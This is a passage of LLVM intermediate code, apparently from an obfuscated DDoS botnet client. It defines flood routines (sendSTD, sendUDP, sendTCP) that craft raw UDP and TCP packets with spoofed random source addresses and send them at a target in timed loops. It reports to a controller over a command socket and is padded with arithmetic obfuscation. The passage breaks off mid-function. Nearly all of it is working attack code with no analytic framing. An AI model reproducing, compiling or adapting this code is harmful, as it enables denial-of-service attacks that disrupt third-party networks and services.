  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %69, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %69

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 65, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add i64 %57, -1151576644544189023
  %61 = add i64 %60, %59
  %62 = sub i64 %61, -1151576644544189023
  %63 = add nsw i64 %57, %59
  %64 = icmp sge i64 %56, %62
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %48
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  call void @_exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %69

; <label>:69:                                     ; preds = %68, %39
  %70 = load i32, i32* %11, align 4
  %71 = sub i32 %70, 579910523
  %72 = add i32 %71, 1
  %73 = add i32 %72, 579910523
  %74 = add i32 %70, 1
  store i32 %73, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %359

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %136

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %359

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = sub i32 0, %66
  %68 = sub i32 0, 1
  %69 = add i32 %67, %68
  %70 = sub i32 0, %69
  %71 = add nsw i32 %66, 1
  %72 = sext i32 %70 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %65
  br label %359

; <label>:77:                                     ; preds = %65
  %78 = load i8*, i8** %20, align 8
  %79 = load i32, i32* %13, align 4
  %80 = sub i32 0, 1
  %81 = sub i32 %79, %80
  %82 = add nsw i32 %79, 1
  %83 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %78, i8 0, i64 %83, i32 1, i1 false)
  %84 = load i8*, i8** %20, align 8
  %85 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %84, i32 %85)
  %86 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %87 = load i32, i32* %11, align 4
  %88 = sub i32 0, %86
  %89 = sub i32 0, %87
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add nsw i32 %86, %87
  store i32 %91, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %93

; <label>:93:                                     ; preds = %129, %125, %115, %77
  %94 = load i32, i32* %19, align 4
  %95 = load i8*, i8** %20, align 8
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %99 = call i64 @sendto(i32 %94, i8* %95, i64 %97, i32 0, %struct.sockaddr* %98, i32 16)
  %100 = load i32, i32* %22, align 4
  %101 = load i32, i32* %18, align 4
  %102 = icmp eq i32 %100, %101
  br i1 %102, label %103, label %116

; <label>:103:                                    ; preds = %93
  %104 = load i32, i32* %10, align 4
  %105 = icmp eq i32 %104, 0
  br i1 %105, label %106, label %110

; <label>:106:                                    ; preds = %103
  %107 = call i32 @rand_cmwc()
  %108 = trunc i32 %107 to i16
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  br label %110

; <label>:110:                                    ; preds = %106, %103
  %111 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %112 = load i32, i32* %21, align 4
  %113 = icmp sgt i32 %111, %112
  br i1 %113, label %114, label %115

; <label>:114:                                    ; preds = %110
  br label %135

; <label>:115:                                    ; preds = %110
  store i32 0, i32* %22, align 4
  br label %93

; <label>:116:                                    ; preds = %93
  %117 = load i32, i32* %22, align 4
  %118 = add i32 %117, -936987980
  %119 = add i32 %118, 1
  %120 = sub i32 %119, -936987980
  %121 = add i32 %117, 1
  store i32 %120, i32* %22, align 4
  %122 = load i32, i32* %23, align 4
  %123 = load i32, i32* %15, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %129

; <label>:125:                                    ; preds = %116
  %126 = load i32, i32* %16, align 4
  %127 = mul nsw i32 %126, 1000
  %128 = call i32 @usleep(i32 %127)
  store i32 0, i32* %23, align 4
  br label %93

; <label>:129:                                    ; preds = %116
  %130 = load i32, i32* %23, align 4
  %131 = add i32 %130, 764402858
  %132 = add i32 %131, 1
  %133 = sub i32 %132, 764402858
  %134 = add i32 %130, 1
  store i32 %133, i32* %23, align 4
  br label %93

; <label>:135:                                    ; preds = %114
  br label %359

; <label>:136:                                    ; preds = %52
  %137 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %137, i32* %24, align 4
  %138 = load i32, i32* %24, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %143, label %140

; <label>:140:                                    ; preds = %136
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %359

; <label>:143:                                    ; preds = %136
  store i32 1, i32* %25, align 4
  %144 = load i32, i32* %24, align 4
  %145 = bitcast i32* %25 to i8*
  %146 = call i32 @setsockopt(i32 %144, i32 0, i32 3, i8* %145, i32 4) #2
  %147 = icmp slt i32 %146, 0
  br i1 %147, label %148, label %151

; <label>:148:                                    ; preds = %143
  %149 = load i32, i32* @mainCommSock, align 4
  %150 = call i32 (i32, i8*, ...) @sockprintf(i32 %149, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  br label %359

; <label>:151:                                    ; preds = %143
  store i32 50, i32* %26, align 4
  br label %152

; <label>:152:                                    ; preds = %160, %151
  %153 = load i32, i32* %26, align 4
  %154 = sub i32 0, %153
  %155 = sub i32 0, -1
  %156 = add i32 %154, %155
  %157 = sub i32 0, %156
  %158 = add nsw i32 %153, -1
  store i32 %157, i32* %26, align 4
  %159 = icmp ne i32 %153, 0
  br i1 %159, label %160, label %175

; <label>:160:                                    ; preds = %152
  %161 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %162 = call i32 @rand_cmwc()
  %163 = xor i32 %161, -1
  %164 = and i32 -589988942, %163
  %165 = xor i32 -589988942, -1
  %166 = and i32 %161, %165
  %167 = xor i32 %162, -1
  %168 = and i32 %167, -589988942
  %169 = and i32 %162, %165
  %170 = or i32 %164, %166
  %171 = or i32 %168, %169
  %172 = xor i32 %170, %171
  %173 = xor i32 %161, %162
  call void @srand(i32 %172) #2
  %174 = call i32 @rand() #2
  call void @init_rand(i32 %174)
  br label %152

; <label>:175:                                    ; preds = %152
  %176 = load i32, i32* %12, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %175
  store i32 0, i32* %27, align 4
  br label %200

; <label>:179:                                    ; preds = %175
  %180 = load i32, i32* %12, align 4
  %181 = sub i32 0, %180
  %182 = add i32 32, %181
  %183 = sub nsw i32 32, %180
  %184 = shl i32 1, %182
  %185 = add i32 %184, 1158619709
  %186 = sub i32 %185, 1
  %187 = sub i32 %186, 1158619709
  %188 = sub nsw i32 %184, 1
  %189 = xor i32 %187, -1
  %190 = and i32 89053823, %189
  %191 = xor i32 89053823, -1
  %192 = and i32 %187, %191
  %193 = xor i32 -1, -1
  %194 = and i32 %193, 89053823
  %195 = and i32 -1, %191
  %196 = or i32 %190, %192
  %197 = or i32 %194, %195
  %198 = xor i32 %196, %197
  %199 = xor i32 %187, -1
  store i32 %198, i32* %27, align 4
  br label %200

; <label>:200:                                    ; preds = %179, %178
  %201 = load i32, i32* %13, align 4
  %202 = sext i32 %201 to i64
  %203 = sub i64 28, -2980090628562563219
  %204 = add i64 %203, %202
  %205 = add i64 %204, -2980090628562563219
  %206 = add i64 28, %202
  %207 = call i8* @llvm.stacksave()
  store i8* %207, i8** %28, align 8
  %208 = alloca i8, i64 %205, align 16
  %209 = bitcast i8* %208 to %struct.iphdr*
  store %struct.iphdr* %209, %struct.iphdr** %29, align 8
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = bitcast %struct.iphdr* %210 to i8*
  %212 = getelementptr i8, i8* %211, i64 20
  %213 = bitcast i8* %212 to %struct.udphdr*
  store %struct.udphdr* %213, %struct.udphdr** %30, align 8
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 4
  %218 = load i32, i32* %27, align 4
  %219 = call i32 @GetRandomIP(i32 %218)
  %220 = call i32 @htonl(i32 %219) #13
  %221 = load i32, i32* %13, align 4
  %222 = sext i32 %221 to i64
  %223 = sub i64 8, 4092953202233144639
  %224 = add i64 %223, %222
  %225 = add i64 %224, 4092953202233144639
  %226 = add i64 8, %222
  %227 = trunc i64 %225 to i32
  call void @makeIPPacket(%struct.iphdr* %214, i32 %217, i32 %220, i8 zeroext 17, i32 %227)
  %228 = load i32, i32* %13, align 4
  %229 = sext i32 %228 to i64
  %230 = sub i64 0, 8
  %231 = sub i64 0, %229
  %232 = add i64 %230, %231
  %233 = sub i64 0, %232
  %234 = add i64 8, %229
  %235 = trunc i64 %233 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #13
  %237 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.2* %238 to %struct.anon.3*
  %240 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %239, i32 0, i32 2
  store i16 %236, i16* %240, align 2
  %241 = call i32 @rand_cmwc()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.2* %244 to %struct.anon.3*
  %246 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %245, i32 0, i32 0
  store i16 %242, i16* %246, align 2
  %247 = load i32, i32* %10, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %200
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %200
  %252 = load i32, i32* %10, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.2* %260 to %struct.anon.3*
  %262 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon.2* %264 to %struct.anon.3*
  %266 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %265, i32 0, i32 3
  store i16 0, i16* %266, align 2
  %267 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %268 = bitcast %struct.udphdr* %267 to i8*
  %269 = getelementptr inbounds i8, i8* %268, i64 8
  %270 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %269, i32 %270)
  %271 = bitcast i8* %208 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* %271, i32 %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %280 = load i32, i32* %11, align 4
  %281 = sub i32 0, %280
  %282 = sub i32 %279, %281
  %283 = add nsw i32 %279, %280
  store i32 %282, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %284

; <label>:284:                                    ; preds = %350, %346, %336, %256
  br label %285

; <label>:285:                                    ; preds = %284
  %286 = load i32, i32* %24, align 4
  %287 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %288 = call i64 @sendto(i32 %286, i8* %208, i64 %205, i32 0, %struct.sockaddr* %287, i32 16)
  %289 = call i32 @rand_cmwc()
  %290 = trunc i32 %289 to i16
  %291 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %292 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon.2* %292 to %struct.anon.3*
  %294 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %293, i32 0, i32 0
  store i16 %290, i16* %294, align 2
  %295 = load i32, i32* %10, align 4
  %296 = icmp eq i32 %295, 0
  br i1 %296, label %297, label %299

; <label>:297:                                    ; preds = %285
  %298 = call i32 @rand_cmwc()
  br label %304

; <label>:299:                                    ; preds = %285
  %300 = load i32, i32* %10, align 4
  %301 = trunc i32 %300 to i16
  %302 = call zeroext i16 @htons(i16 zeroext %301) #13
  %303 = zext i16 %302 to i32
  br label %304

; <label>:304:                                    ; preds = %299, %297
  %305 = phi i32 [ %298, %297 ], [ %303, %299 ]
  %306 = trunc i32 %305 to i16
  %307 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.2* %308 to %struct.anon.3*
  %310 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %309, i32 0, i32 1
  store i16 %306, i16* %310, align 2
  %311 = call i32 @rand_cmwc()
  %312 = trunc i32 %311 to i16
  %313 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 3
  store i16 %312, i16* %314, align 4
  %315 = load i32, i32* %27, align 4
  %316 = call i32 @GetRandomIP(i32 %315)
  %317 = call i32 @htonl(i32 %316) #13
  %318 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 8
  store i32 %317, i32* %319, align 4
  %320 = bitcast i8* %208 to i16*
  %321 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 2
  %323 = load i16, i16* %322, align 2
  %324 = zext i16 %323 to i32
  %325 = call zeroext i16 @csum(i16* %320, i32 %324)
  %326 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i32 0, i32 7
  store i16 %325, i16* %327, align 2
  %328 = load i32, i32* %32, align 4
  %329 = load i32, i32* %18, align 4
  %330 = icmp eq i32 %328, %329
  br i1 %330, label %331, label %337

; <label>:331:                                    ; preds = %304
  %332 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %333 = load i32, i32* %31, align 4
  %334 = icmp sgt i32 %332, %333
  br i1 %334, label %335, label %336

; <label>:335:                                    ; preds = %331
  br label %357

; <label>:336:                                    ; preds = %331
  store i32 0, i32* %32, align 4
  br label %284

; <label>:337:                                    ; preds = %304
  %338 = load i32, i32* %32, align 4
  %339 = sub i32 %338, 1901333202
  %340 = add i32 %339, 1
  %341 = add i32 %340, 1901333202
  %342 = add i32 %338, 1
  store i32 %341, i32* %32, align 4
  %343 = load i32, i32* %33, align 4
  %344 = load i32, i32* %15, align 4
  %345 = icmp eq i32 %343, %344
  br i1 %345, label %346, label %350

; <label>:346:                                    ; preds = %337
  %347 = load i32, i32* %16, align 4
  %348 = mul nsw i32 %347, 1000
  %349 = call i32 @usleep(i32 %348)
  store i32 0, i32* %33, align 4
  br label %284

; <label>:350:                                    ; preds = %337
  %351 = load i32, i32* %33, align 4
  %352 = sub i32 0, %351
  %353 = sub i32 0, 1
  %354 = add i32 %352, %353
  %355 = sub i32 0, %354
  %356 = add i32 %351, 1
  store i32 %355, i32* %33, align 4
  br label %284

; <label>:357:                                    ; preds = %335
  %358 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %358)
  br label %359

; <label>:359:                                    ; preds = %357, %148, %140, %135, %76, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %546

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %546

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  br label %546

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %83

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 32, -450839816
  %69 = sub i32 %68, %67
  %70 = add i32 %69, -450839816
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = add i32 %72, 757058464
  %74 = sub i32 %73, 1
  %75 = sub i32 %74, 757058464
  %76 = sub nsw i32 %72, 1
  %77 = xor i32 %75, -1
  %78 = and i32 -1, %77
  %79 = xor i32 -1, -1
  %80 = and i32 %75, %79
  %81 = or i32 %78, %80
  %82 = xor i32 %75, -1
  store i32 %81, i32* %19, align 4
  br label %83

; <label>:83:                                     ; preds = %66, %65
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = add i64 40, 6904357622573156312
  %87 = add i64 %86, %85
  %88 = sub i64 %87, 6904357622573156312
  %89 = add i64 40, %85
  %90 = call i8* @llvm.stacksave()
  store i8* %90, i8** %20, align 8
  %91 = alloca i8, i64 %88, align 16
  %92 = bitcast i8* %91 to %struct.iphdr*
  store %struct.iphdr* %92, %struct.iphdr** %21, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %94 = bitcast %struct.iphdr* %93 to i8*
  %95 = getelementptr i8, i8* %94, i64 20
  %96 = bitcast i8* %95 to %struct.tcphdr*
  store %struct.tcphdr* %96, %struct.tcphdr** %22, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %99 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 4
  %101 = load i32, i32* %19, align 4
  %102 = call i32 @GetRandomIP(i32 %101)
  %103 = call i32 @htonl(i32 %102) #13
  %104 = load i32, i32* %13, align 4
  %105 = sext i32 %104 to i64
  %106 = sub i64 0, 20
  %107 = sub i64 0, %105
  %108 = add i64 %106, %107
  %109 = sub i64 0, %108
  %110 = add i64 20, %105
  %111 = trunc i64 %109 to i32
  call void @makeIPPacket(%struct.iphdr* %97, i32 %100, i32 %103, i8 zeroext 6, i32 %111)
  %112 = call i32 @rand_cmwc()
  %113 = trunc i32 %112 to i16
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 0
  store i16 %113, i16* %117, align 4
  %118 = call i32 @rand_cmwc()
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon.0* %120 to %struct.anon.1*
  %122 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %121, i32 0, i32 2
  store i32 %118, i32* %122, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.0* %124 to %struct.anon.1*
  %126 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %125, i32 0, i32 3
  store i32 0, i32* %126, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = xor i16 -241, -1
  %133 = xor i16 %131, %132
  %134 = and i16 %133, %131
  %135 = and i16 %131, -241
  %136 = xor i16 %134, -1
  %137 = xor i16 80, -1
  %138 = xor i16 -14033, -1
  %139 = and i16 %136, -14033
  %140 = and i16 %134, %138
  %141 = and i16 %137, -14033
  %142 = and i16 80, %138
  %143 = or i16 %139, %140
  %144 = or i16 %141, %142
  %145 = xor i16 %143, %144
